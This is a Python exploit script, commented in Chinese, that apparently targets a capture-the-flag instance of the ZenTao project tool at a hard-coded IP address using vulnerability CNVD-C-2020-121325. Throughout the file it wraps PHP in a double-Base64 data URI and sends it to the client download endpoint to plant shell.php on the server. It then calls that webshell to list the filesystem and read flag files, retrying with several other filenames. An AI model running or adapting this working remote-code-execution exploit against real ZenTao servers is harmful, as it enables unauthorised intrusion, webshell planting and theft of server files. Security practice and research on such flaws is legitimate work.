#!/usr/bin/env python3
"""
禅道 CNVD-C-2020-121325 - 正确的利用方式
关键：双重 Base64 编码 + Data URI + f=download
"""

import requests
import base64
import time

def solve_with_download_method():
    base_url = "http://47.113.178.182:32829"
    session = requests.Session()

    print("""
╔═══════════════════════════════════════════════════════════════╗
║      禅道 CNVD-C-2020-121325 - 双重 Base64 + Data URI        ║
╚═══════════════════════════════════════════════════════════════╝
    """)

    print("[*] 正在利用 m=client&f=download (双重Base64 + Data URI)...\n")

    # 1. 准备 PHP Payload (使用 scandir 和 file_get_contents 绕过 system 限制)
    php_code = """<?php
error_reporting(0);
$output = "---BEGIN---\\n";

// 扫描根目录
$output .= "Files in /:\\n";
$files = scandir('/');
foreach($files as $f) { $output .= $f . " "; }
$output .= "\\n\\n";

// 暴力读取 flag
$output .= "Trying to read /flag:\\n";
$output .= file_get_contents('/flag');
$output .= "\\n\\nTrying to read /flag.txt:\\n";
$output .= file_get_contents('/flag.txt');

// 查找包含 flag 的文件
$glob = glob("/*flag*");
if($glob) {
    foreach($glob as $g) {
        $output .= "\\nContent of $g:\\n" . file_get_contents($g);
    }
}

echo $output;
?>"""

    print("[*] PHP Payload 准备完成")
    print(f"    长度: {len(php_code)} bytes\n")

    # 2. 第一层编码: PHP -> Base64
    payload_b64 = base64.b64encode(php_code.encode()).decode()
    print(f"[*] 第一层 Base64 编码完成")
    print(f"    长度: {len(payload_b64)} bytes\n")

    # 3. 构造 Data URI
    # 注意：这里的 #/shell.php 是为了配合 download 函数的解析逻辑
    data_uri = f"data:text/plain;base64,{payload_b64}#/shell.php"
    print(f"[*] Data URI 构造完成")
    print(f"    格式: data:text/plain;base64,{payload_b64[:30]}...#/shell.php")
    print(f"    长度: {len(data_uri)} bytes\n")

    # 4. 第二层编码: Data URI -> Base64 (这是传给 link 参数的值)
    link_param = base64.b64encode(data_uri.encode()).decode()
    print(f"[*] 第二层 Base64 编码完成 (link 参数)")
    print(f"    内容: {link_param[:60]}...")
    print(f"    长度: {len(link_param)} bytes\n")

    # 5. 发送攻击请求
    upload_url = f"{base_url}/zentao/index.php"
    params = {
        "m": "client",
        "f": "download",
        "link": link_param,
        "fileName": "shell.php"
    }

    print("=" * 70)
    print("发送 Payload")
    print("=" * 70)
    print(f"URL: {upload_url}")
    print(f"参数: m={params['m']}, f={params['f']}, fileName={params['fileName']}")
    print(f"Link 参数长度: {len(params['link'])} bytes\n")

    try:
        print("[*] 发送请求...")
        res = session.get(upload_url, params=params, timeout=15)
        print(f"    响应码: {res.status_code}")
        print(f"    响应长度: {len(res.content)} bytes")

        if res.text.strip():
            print(f"    响应内容: {res.text[:200]}")

        # 6. 验证结果
        shell_url = f"{base_url}/zentao/data/client/1/shell.php"
        print(f"\n[*] 等待文件写入...")
        time.sleep(2)

        print(f"[*] 访问 Shell: {shell_url}")

        res = session.get(shell_url, timeout=10)
        print(f"    Shell 状态: {res.status_code}")
        print(f"    Shell 大小: {len(res.content)} bytes")

        if len(res.content) > 0:
            print("\n" + "=" * 70)
            print("✓✓✓ 成功! Shell 输出:")
            print("=" * 70)
            print(res.text)
            print("=" * 70)

            if "flag{" in res.text.lower() or "ctf{" in res.text.lower():
                print("\n🚩🚩🚩 Flag 获取成功! 🚩🚩🚩")
                return res.text
        else:
            print("\n[-] Shell 仍然为空")

            # 尝试其他可能的路径
            print("\n[*] 尝试其他可能的文件路径...")
            alternative_paths = [
                f"{base_url}/zentao/data/client/shell.php",
                f"{base_url}/zentao/data/client/downloads/shell.php",
                f"{base_url}/zentao/tmp/shell.php",
            ]

            for path in alternative_paths:
                print(f"    检查: {path}")
                r = session.get(path, timeout=5)
                if r.status_code == 200 and len(r.content) > 0:
                    print(f"    ✓ 找到! 大小: {len(r.content)}")
                    print(r.text[:500])

    except Exception as e:
        print(f"\n[-] 发生错误: {e}")
        import traceback
        traceback.print_exc()

    return None


def test_alternative_filenames():
    """尝试不同的文件名，有时候 fileName 参数会影响结果"""
    base_url = "http://47.113.178.182:32829"
    session = requests.Session()

    print("\n" + "=" * 70)
    print("测试不同的文件名")
    print("=" * 70)

    # 简单的测试 payload
    test_php = "<?php echo file_get_contents('/flag'); ?>"
    payload_b64 = base64.b64encode(test_php.encode()).decode()

    filenames = ["test.php", "1.php", "getflag.php", "x.php"]

    for fname in filenames:
        data_uri = f"data:text/plain;base64,{payload_b64}#/{fname}"
        link_param = base64.b64encode(data_uri.encode()).decode()

        params = {
            "m": "client",
            "f": "download",
            "link": link_param,
            "fileName": fname
        }

        print(f"\n[*] 测试文件名: {fname}")

        try:
            res = session.get(f"{base_url}/zentao/index.php", params=params, timeout=10)
            print(f"    上传响应: {res.status_code}")

            time.sleep(1)

            file_url = f"{base_url}/zentao/data/client/1/{fname}"
            r = session.get(file_url, timeout=5)

            if r.status_code == 200 and len(r.content) > 0:
                print(f"    ✓ 文件有内容! 大小: {len(r.content)}")
                print(f"    内容: {r.text[:200]}")

                if "flag{" in r.text.lower() or "ctf{" in r.text.lower():
                    print("\n🚩 找到 Flag!")
                    return r.text

        except Exception as e:
            print(f"    错误: {e}")

    return None


if __name__ == "__main__":
    print("[*] 开始利用...\n")

    # 主攻击
    result = solve_with_download_method()

    # 如果失败，尝试其他文件名
    if not result:
        print("\n[*] 主攻击失败，尝试其他文件名...")
        result = test_alternative_filenames()

    if result:
        print("\n" + "=" * 70)
        print("任务完成! 最终结果:")
        print("=" * 70)
        print(result)
        print("=" * 70)
    else:
        print("\n[-] 所有方法都失败了")
        print("[*] 可能原因:")
        print("    1. 服务器端对 data:// 协议有限制")
        print("    2. link 参数需要特殊的编码或格式")
        print("    3. 需要额外的认证或 Cookie")
